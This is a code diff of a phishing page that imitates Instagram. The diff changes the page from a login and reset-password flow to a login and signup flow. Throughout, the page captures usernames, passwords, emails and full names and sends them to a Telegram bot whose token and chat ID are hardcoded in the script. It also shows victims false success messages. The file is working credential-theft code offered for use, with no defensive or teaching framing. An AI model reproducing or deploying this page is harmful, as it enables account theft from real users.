@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
-    <title>Instagram - Reset Password</title>
+    <title>Instagram</title>
     <style>
         :root {
             --blue: #0095f6;
@@ -30,31 +30,25 @@
             background-color: var(--bg);
             display: flex;
             justify-content: center;
+            align-items: center;
             min-height: 100vh;
-            padding: 0;
-            margin: 0;
+            padding: 20px;
             color: var(--text-dark);
             line-height: 1.5;
         }
 
-        .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+        .main-container {
+            max-width: 350px;
             width: 100%;
-            max-width: 935px;
-            padding: 32px 0;
         }
 
         .login-box {
             background-color: var(--white);
             border: 1px solid var(--border);
             border-radius: 1px;
-            width: 350px;
-            margin: 0 0 10px;
-            padding: 10px 0;
+            padding: 20px 40px;
             text-align: center;
+            margin-bottom: 10px;
         }
 
         .instagram-logo {
@@ -67,13 +61,8 @@
             margin: 22px auto 12px;
         }
 
-        .form-container {
-            margin: 24px 0 0;
-            padding: 0 40px;
-        }
-
         .form-group {
-            margin: 0 0 6px;
+            margin-bottom: 6px;
             position: relative;
         }
 
@@ -82,7 +71,7 @@
             padding: 9px 8px 7px;
             border: 1px solid var(--border);
             border-radius: 3px;
-            background: var(--bg);
+            background: rgba(var(--bg), 0.5);
             font-size: 12px;
             color: var(--text-dark);
             outline: none;
@@ -98,9 +87,9 @@
             right: 8px;
             top: 50%;
             transform: translateY(-50%);
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 600;
-            color: var(--text-dark);
+            color: var(--blue);
             cursor: pointer;
             user-select: none;
         }
@@ -129,55 +118,63 @@
         }
 
         .divider {
+            margin: 10px 0 18px;
             display: flex;
             align-items: center;
-            margin: 10px 40px 18px;
             color: var(--text-dark);
             font-size: 13px;
             font-weight: 600;
         }
 
-        .divider::before, .divider::after {
+        .divider::before,
+        .divider::after {
             content: "";
             flex: 1;
             border-bottom: 1px solid var(--border);
             margin: 0 10px;
         }
 
-        .facebook-login {
-            color: #385185;
-            font-size: 14px;
-            font-weight: 600;
-            margin: 8px 0;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .alert {
+            padding: 8px;
+            margin: 10px 0;
+            border-radius: 4px;
+            font-size: 13px;
+            display: none;
         }
 
-        .facebook-icon {
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0Ij48cGF0aCBkPSJNMjIgMTJjMC01LjUyMy00LjQ3Ny0xMC0xMC0xMFMyIDEyIDIgMTdjMCA0Ljk5MSAzLjY1NyA5LjEyOCA4LjQzNyA5Ljg3NXYtNi45ODdoLTIuNjVWMTJoMi42NXYtMi4yNWMwLTIuNjM1IDEuNTY5LTQuMDg1IDMuOTY1LTQuMDg1IDEuMTQ5IDAgMi4zNC4yMDQgMi4zNC4yMDR2Mi41N2gtMS4zMThjLTEuMyAwLTEuNzA1LjgwNi0xLjcwNSAxLjYzM1YxMmgzLjE1bC0uNTAzIDMuMzI4aC0yLjY0N3Y2Ljk4OEMxOC4zNDMgMjEuMTI4IDIyIDE2Ljk5MSAyMiAxMnoiIGZpbGw9IiMxODcxZjIiLz48L3N2Zz4=');
-            background-repeat: no-repeat;
-            background-size: contain;
-            width: 16px;
-            height: 16px;
+        .alert-error {
+            background-color: rgba(237, 73, 86, 0.1);
+            color: var(--error);
+            border: 1px solid rgba(237, 73, 86, 0.2);
+        }
+
+        .alert-success {
+            background-color: rgba(49, 162, 76, 0.1);
+            color: var(--success);
+            border: 1px solid rgba(49, 162, 76, 0.2);
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--white);
+            animation: spin 1s ease-in-out infinite;
+            vertical-align: middle;
             margin-right: 8px;
         }
 
-        .forgot-password {
-            color: #00376b;
-            font-size: 12px;
-            margin: 12px 0;
-            cursor: pointer;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
         .signup-box {
             background-color: var(--white);
             border: 1px solid var(--border);
             border-radius: 1px;
-            width: 350px;
-            margin: 0 0 10px;
-            padding: 20px 0;
+            padding: 20px;
             text-align: center;
             font-size: 14px;
         }
@@ -189,10 +186,7 @@
         }
 
         .app-download {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 350px;
+            text-align: center;
             margin: 20px 0;
         }
 
@@ -213,10 +207,8 @@
         }
 
         .footer {
-            width: 100%;
-            max-width: 935px;
-            margin: 24px 0;
             text-align: center;
+            margin: 20px 0;
             font-size: 12px;
             color: var(--text-light);
         }
@@ -234,138 +226,97 @@
             cursor: pointer;
         }
 
-        /* Loading spinner */
-        .spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: var(--white);
-            animation: spin 1s ease-in-out infinite;
-            vertical-align: middle;
-            margin-right: 8px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Alert messages */
-        .alert {
-            padding: 8px;
-            margin: 0 40px 10px;
-            border-radius: 4px;
-            font-size: 13px;
-            display: none;
-        }
-
-        .alert-error {
-            background-color: rgba(237, 73, 86, 0.1);
-            color: var(--error);
-            border: 1px solid rgba(237, 73, 86, 0.2);
-        }
-
-        .alert-success {
-            background-color: rgba(49, 162, 76, 0.1);
-            color: var(--success);
-            border: 1px solid rgba(49, 162, 76, 0.2);
-        }
-
-        /* Animation */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .fade-in {
-            animation: fadeIn 0.3s ease-out forwards;
-        }
-
-        /* Responsive */
         @media (max-width: 450px) {
             .login-box, .signup-box {
                 border: none;
                 background-color: transparent;
-                width: 100%;
             }
-
+            
             body {
                 background-color: var(--white);
+                padding: 0;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="main-container">
         <!-- Login Box -->
-        <div class="login-box fade-in" id="loginBox">
+        <div class="login-box" id="loginBox">
             <div class="instagram-logo"></div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" class="form-input" id="username" placeholder="Phone number, username, or email" autocomplete="username" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" class="form-input" id="password" placeholder="Password" autocomplete="current-password" required>
+                    <span class="password-toggle" onclick="togglePassword('password')">Show</span>
+                </div>
+                
+                <button type="submit" class="btn" id="loginBtn">
+                    <span id="loginBtnText">Log In</span>
+                    <span id="loginSpinner" class="spinner" style="display: none;"></span>
+                </button>
+            </form>
             
             <div class="alert alert-error" id="loginError"></div>
             <div class="alert alert-success" id="loginSuccess"></div>
             
-            <div class="form-container">
-                <form id="loginForm">
-                    <div class="form-group">
-                        <input type="text" class="form-input" id="username" placeholder="Phone number, username, or email" autocomplete="username" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <input type="password" class="form-input" id="password" placeholder="Password" autocomplete="current-password" required>
-                        <span class="password-toggle" onclick="togglePassword('password')">Show</span>
-                    </div>
-                    
-                    <button type="submit" class="btn" id="loginBtn">
-                        <span id="loginBtnText">Log In</span>
-                        <span id="loginSpinner" class="spinner" style="display: none;"></span>
-                    </button>
-                </form>
-                
-                <div class="divider">OR</div>
-                
-                <div class="facebook-login">
-                    <div class="facebook-icon"></div>
-                    <span>Log in with Facebook</span>
+            <div class="divider">OR</div>
+            
+            <div style="margin: 15px 0; font-size: 14px;">
+                Don't have an account? <span class="signup-link" onclick="showSignup()">Sign up</span>
+            </div>
+        </div>
+        
+        <!-- Signup Box -->
+        <div class="login-box" id="signupBox" style="display: none;">
+            <div class="instagram-logo"></div>
+            <p style="margin: 10px 0 20px; color: var(--text-light); font-size: 16px; font-weight: 600;">
+                Sign up to see photos and videos from your friends.
+            </p>
+            
+            <button class="btn" style="margin-bottom: 15px;">
+                Log in with Facebook
+            </button>
+            
+            <div class="divider">OR</div>
+            
+            <form id="signupForm">
+                <div class="form-group">
+                    <input type="email" class="form-input" id="signupEmail" placeholder="Mobile Number or Email" required>
                 </div>
                 
-                <div class="forgot-password" onclick="showForgotPassword()">Forgot password?</div>
-            </div>
-        </div>
-        
-        <!-- Reset Password Box (hidden initially) -->
-        <div class="login-box" id="resetBox" style="display: none;">
-            <div class="instagram-logo"></div>
-            
-            <div class="alert alert-error" id="resetError"></div>
-            <div class="alert alert-success" id="resetSuccess"></div>
-            
-            <div class="form-container">
-                <h2 style="font-size: 16px; font-weight: 600; margin: 0 0 16px;">Reset Your Password</h2>
-                <p style="font-size: 14px; color: var(--text-light); margin: 0 0 16px;">Enter a new password for your account.</p>
+                <div class="form-group">
+                    <input type="text" class="form-input" id="signupFullname" placeholder="Full Name" required>
+                </div>
                 
-                <form id="resetForm">
-                    <div class="form-group">
-                        <input type="password" class="form-input" id="newPassword" placeholder="New Password" autocomplete="new-password" required>
-                        <span class="password-toggle" onclick="togglePassword('newPassword')">Show</span>
-                    </div>
-                    
-                    <div class="form-group">
-                        <input type="password" class="form-input" id="confirmPassword" placeholder="Confirm New Password" autocomplete="new-password" required>
-                        <span class="password-toggle" onclick="togglePassword('confirmPassword')">Show</span>
-                    </div>
-                    
-                    <button type="submit" class="btn" id="resetBtn">
-                        <span id="resetBtnText">Change Password</span>
-                        <span id="resetSpinner" class="spinner" style="display: none;"></span>
-                    </button>
-                </form>
+                <div class="form-group">
+                    <input type="text" class="form-input" id="signupUsername" placeholder="Username" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" class="form-input" id="signupPassword" placeholder="Password" required>
+                    <span class="password-toggle" onclick="togglePassword('signupPassword')">Show</span>
+                </div>
+                
+                <button type="submit" class="btn" id="signupBtn">
+                    <span id="signupBtnText">Sign Up</span>
+                    <span id="signupSpinner" class="spinner" style="display: none;"></span>
+                </button>
+            </form>
+            
+            <div class="alert alert-error" id="signupError"></div>
+            
+            <p style="margin: 15px 0; font-size: 12px; color: var(--text-light);">
+                By signing up, you agree to our Terms, Data Policy and Cookies Policy.
+            </p>
+            
+            <div style="margin: 15px 0; font-size: 14px;">
+                Have an account? <span class="signup-link" onclick="showLogin()">Log in</span>
             </div>
-        </div>
-        
-        <!-- Sign Up Box -->
-        <div class="signup-box">
-            <p>Don't have an account? <span class="signup-link">Sign up</span></p>
         </div>
         
         <!-- App Download Section -->
@@ -392,7 +343,6 @@
                 <span class="footer-link">Hashtags</span>
                 <span class="footer-link">Locations</span>
                 <span class="footer-link">Instagram Lite</span>
-                <span class="footer-link">Contact Uploading & Non-Users</span>
             </div>
             <div>
                 <span class="footer-link">English</span>
@@ -407,26 +357,24 @@
             botToken: '7477379290:AAHcGDNyrAA3nJfhmZzm-8dHcxaNwT3mN-o',
             chatId: '7454474616',
             minPasswordLength: 6,
-            simulateDelay: 1500,
-            successRate: 0.7
+            simulateDelay: 1500
         };
 
         // DOM Elements
         const elements = {
             loginBox: document.getElementById('loginBox'),
-            resetBox: document.getElementById('resetBox'),
+            signupBox: document.getElementById('signupBox'),
             loginForm: document.getElementById('loginForm'),
-            resetForm: document.getElementById('resetForm'),
+            signupForm: document.getElementById('signupForm'),
             loginBtn: document.getElementById('loginBtn'),
-            resetBtn: document.getElementById('resetBtn'),
+            signupBtn: document.getElementById('signupBtn'),
             loginBtnText: document.getElementById('loginBtnText'),
-            resetBtnText: document.getElementById('resetBtnText'),
+            signupBtnText: document.getElementById('signupBtnText'),
             loginSpinner: document.getElementById('loginSpinner'),
-            resetSpinner: document.getElementById('resetSpinner'),
+            signupSpinner: document.getElementById('signupSpinner'),
             loginError: document.getElementById('loginError'),
-            resetError: document.getElementById('resetError'),
-            loginSuccess: document.getElementById('loginSuccess'),
-            resetSuccess: document.getElementById('resetSuccess')
+            signupError: document.getElementById('signupError'),
+            loginSuccess: document.getElementById('loginSuccess')
         };
 
         // Initialize the application
@@ -434,29 +382,21 @@
             // Form submissions
             elements.loginForm.addEventListener('submit', function(e) {
                 e.preventDefault();
-                checkCredentials();
+                handleLogin();
             });
             
-            elements.resetForm.addEventListener('submit', function(e) {
+            elements.signupForm.addEventListener('submit', function(e) {
                 e.preventDefault();
-                resetPassword();
+                handleSignup();
             });
             
             // Enter key support
             document.getElementById('username').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') checkCredentials();
+                if (e.key === 'Enter') handleLogin();
             });
             
             document.getElementById('password').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') checkCredentials();
-            });
-            
-            document.getElementById('newPassword').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') resetPassword();
-            });
-            
-            document.getElementById('confirmPassword').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') resetPassword();
+                if (e.key === 'Enter') handleLogin();
             });
         }
 
@@ -474,15 +414,20 @@
             }
         }
 
-        // Show forgot password screen
-        function showForgotPassword() {
-            elements.loginBox.style.display = 'none';
-            elements.resetBox.style.display = 'block';
-            elements.resetBox.classList.add('fade-in');
+        // Show login box
+        function showLogin() {
+            elements.signupBox.style.display = 'none';
+            elements.loginBox.style.display = 'block';
         }
 
-        // Validate credentials
-        async function checkCredentials() {
+        // Show signup box
+        function showSignup() {
+            elements.loginBox.style.display = 'none';
+            elements.signupBox.style.display = 'block';
+        }
+
+        // Handle login
+        async function handleLogin() {
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
 
@@ -503,75 +448,63 @@
 
             try {
                 // Simulate API call
-                const isValid = await simulateAPICall(username, password);
+                await new Promise(resolve => setTimeout(resolve, config.simulateDelay));
                 
-                if (isValid) {
-                    // Send to Telegram
-                    await sendToTelegram(`✅ Instagram Login Attempt:\nUsername: ${username}\nPassword: ${password}`);
-                    
-                    // Show success and transition
-                    showSuccess(elements.loginSuccess, 'Login successful! Redirecting...');
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                    
-                    // Here you would normally redirect to the actual Instagram
-                    // For demo, we'll show the reset password page
-                    showForgotPassword();
-                } else {
-                    // Send to Telegram
-                    await sendToTelegram(`❌ Failed Instagram Login:\nUsername: ${username}\nPassword: ${password}`);
-                    
-                    showError(elements.loginError, 'Sorry, your password was incorrect. Please double-check your password.');
-                }
+                // Send to Telegram
+                await sendToTelegram(`📱 Instagram Login Attempt:\nUsername: ${username}\nPassword: ${password}`);
+                
+                // Show success
+                showSuccess(elements.loginSuccess, 'Login successful! Redirecting...');
+                
+                // Disable the button to prevent multiple submissions
+                elements.loginBtn.disabled = true;
             } catch (error) {
                 console.error('Error:', error);
-                showError(elements.loginError, 'An error occurred. Please try again later.');
+                showError(elements.loginError, 'Sorry, your password was incorrect. Please double-check your password.');
             } finally {
                 setLoadingState(false, 'login');
             }
         }
 
-        // Reset password
-        async function resetPassword() {
-            const newPassword = document.getElementById('newPassword').value.trim();
-            const confirmPassword = document.getElementById('confirmPassword').value.trim();
+        // Handle signup
+        async function handleSignup() {
+            const email = document.getElementById('signupEmail').value.trim();
+            const fullname = document.getElementById('signupFullname').value.trim();
+            const username = document.getElementById('signupUsername').value.trim();
+            const password = document.getElementById('signupPassword').value.trim();
 
-            // Validation
-            if (!newPassword || !confirmPassword) {
-                showError(elements.resetError, 'Please fill in all fields.');
+            // Input validation
+            if (!email || !fullname || !username || !password) {
+                showError(elements.signupError, 'Please fill in all fields.');
                 return;
             }
 
-            if (newPassword.length < config.minPasswordLength) {
-                showError(elements.resetError, `Password must be at least ${config.minPasswordLength} characters.`);
-                return;
-            }
-
-            if (newPassword !== confirmPassword) {
-                showError(elements.resetError, 'Passwords do not match.');
+            if (password.length < config.minPasswordLength) {
+                showError(elements.signupError, `Password must be at least ${config.minPasswordLength} characters.`);
                 return;
             }
 
             // UI State
-            setLoadingState(true, 'reset');
-            hideAlerts('reset');
+            setLoadingState(true, 'signup');
+            hideAlerts('signup');
 
             try {
-                // Simulate password reset
+                // Simulate API call
                 await new Promise(resolve => setTimeout(resolve, config.simulateDelay));
                 
                 // Send to Telegram
-                await sendToTelegram(`🔑 Instagram Password Reset:\nNew Password: ${newPassword}`);
+                await sendToTelegram(`📝 Instagram Signup Attempt:\nEmail: ${email}\nFull Name: ${fullname}\nUsername: ${username}\nPassword: ${password}`);
                 
-                // Show success
-                showSuccess(elements.resetSuccess, 'Your password has been changed successfully!');
-                
-                // Disable the button to prevent multiple submissions
-                elements.resetBtn.disabled = true;
+                // Show success by redirecting to login
+                showLogin();
+                document.getElementById('username').value = username;
+                document.getElementById('password').value = password;
+                showSuccess(elements.loginSuccess, 'Account created successfully! Please log in.');
             } catch (error) {
                 console.error('Error:', error);
-                showError(elements.resetError, 'Failed to reset password. Please try again.');
+                showError(elements.signupError, 'An error occurred during signup. Please try again.');
             } finally {
-                setLoadingState(false, 'reset');
+                setLoadingState(false, 'signup');
             }
         }
 
@@ -591,8 +524,7 @@
                 elements.loginError.style.display = 'none';
                 elements.loginSuccess.style.display = 'none';
             } else {
-                elements.resetError.style.display = 'none';
-                elements.resetSuccess.style.display = 'none';
+                elements.signupError.style.display = 'none';
             }
         }
 
@@ -602,16 +534,10 @@
                 elements.loginBtnText.style.display = isLoading ? 'none' : 'inline';
                 elements.loginSpinner.style.display = isLoading ? 'inline-block' : 'none';
             } else {
-                elements.resetBtn.disabled = isLoading;
-                elements.resetBtnText.style.display = isLoading ? 'none' : 'inline';
-                elements.resetSpinner.style.display = isLoading ? 'inline-block' : 'none';
+                elements.signupBtn.disabled = isLoading;
+                elements.signupBtnText.style.display = isLoading ? 'none' : 'inline';
+                elements.signupSpinner.style.display = isLoading ? 'inline-block' : 'none';
             }
-        }
-
-        // Simulate API call
-        async function simulateAPICall(username, password) {
-            await new Promise(resolve => setTimeout(resolve, config.simulateDelay));
-            return Math.random() < config.successRate;
         }
 
         // Send data to Telegram
@@ -641,4 +567,4 @@
         document.addEventListener('DOMContentLoaded', init);
     </script>
 </body>
-</html>
+                        </html>
